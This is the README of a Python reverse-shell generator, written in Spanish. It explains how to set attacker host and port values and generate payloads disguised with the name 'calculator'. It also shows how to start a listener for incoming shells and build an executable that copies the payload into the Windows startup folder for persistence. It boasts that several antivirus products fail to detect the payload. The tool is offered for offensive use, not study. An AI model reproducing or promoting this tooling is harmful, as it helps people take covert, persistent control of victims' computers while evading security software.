# Reverse Shell

Proyecto que consiste en generar un payload de reverse shell en python, el cual se ejecuta en la máquina objetivo y se conecta a un servidor controlado por el atacante.

- [Reverse Shell](#reverse-shell)
  - [Requisitos](#requisitos)
  - [Instalación](#instalación)
  - [Uso](#uso)
  - [Comandos](#comandos)
  - [Ejemplos](#ejemplos)
    - [Payload](#payload)
    - [Servidor en escucha](#servidor-en-escucha)
    - [Autoexe](#autoexe)
  - [Pruebas realizadas en antivirus](#pruebas-realizadas-en-antivirus)
  - [Resultados de virustotal.com](#resultados-de-virustotalcom)
  - [Capturas](#capturas)

## Requisitos

- ![Static Badge](https://img.shields.io/badge/Python-^3.12-yellow?logo=python&logoColor=white)

## Instalación

Clona el repositorio

```bash
git clone https://github.com/epmyas2022/reverse_shell.git
```

Entra al directorio del proyecto

```bash
cd reverse_shell
```

Instala las dependencias

```bash
pip install -r requirements.txt
```

## Uso

```bash
python reverse_shell.py
```

## Comandos

- `help`: Muestra la lista de comandos disponibles.
- `generate`: Genera un payload de reverse shell en python.
- `execute`: Inicia un servidor que escucha las conexiones de los payloads generados.
- `autoexe`: Genera un exe que creara una copia del payload en la carpeta de inicio de Windows.
- `set`: Establece el valor de una variable.
- `exit`: Salir del programa.

## Ejemplos

Generar un payload de reverse shell especificando la dirección IP y el puerto del servidor

El siguiente comando setea la direccion IP del payload:

### Payload

```bash
set generate.lhost 10.0.0.20
```

El siguiente comando setea el puerto del payload:

```bash
set generate.lport 4444
```

El siguiente comando genera el payload:

```bash
generate
```

![Reverse Shell Generate Command](./images/payload.png)

Los payloads generados se guardan en la carpeta raíz del proyecto. con el siguiente nombre: `calculator-{timestamp}`

### Servidor en escucha

Iniciar el servidor que escucha las conexiones de los payloads generados

El siguiente comando setea el puerto del servidor:

```bash
set session.lport 4444
```

El siguient comando setea el host del servidor:

```bash
set session.lhost 10.0.0.20
```

El siguiente comando inicia el servidor:

```bash
execute
```

![Reverse Shell Execute Command](./images/execute.png)

Para detener la escucha del servidor, presiona `Ctrl + C`

Para salir de la sesión, ejecuta el comando `exit`

### Autoexe

Generar un autoexe creara una copia del payload en la carpeta de inicio de Windows.

Antes que nada, se debe generar un payload.

El siguiente comando setea el nombre del archivo:

```bash
set windows.autoexe.path <nombre_del_payload>
```

El siguiente comando genera el autoexe:

```bash
autoexe
```

![Reverse Shell Autoexe Command](./images/autoexe.png)

## Pruebas realizadas en antivirus

✅ = No detectado
❌ = Detectado

- Windows Defender [✅]
- Avast [✅]
- ESETNOD32 [✅]
- McAfee [✅]
- Bitdefender [✅]
- Bkav Pro [❌]
- SecureAge [❌]
- Kaspersky [❌]
- Skyhigh (SWG) [❌]

## Resultados de virustotal.com

- [Payload]("https://www.virustotal.com/gui/file/a3529b34abafcf1bb4ae8bebb464d7a79a22ea1bd9a14dfdd53072edd2d28911")
- [Autoexe]("https://www.virustotal.com/gui/file/9988d8ba90ad03359e79be815032e616d1f76432a12208c659b1cd2a8a719f7b/detection")

## Capturas

![Reverse Shell](./images/image.png)
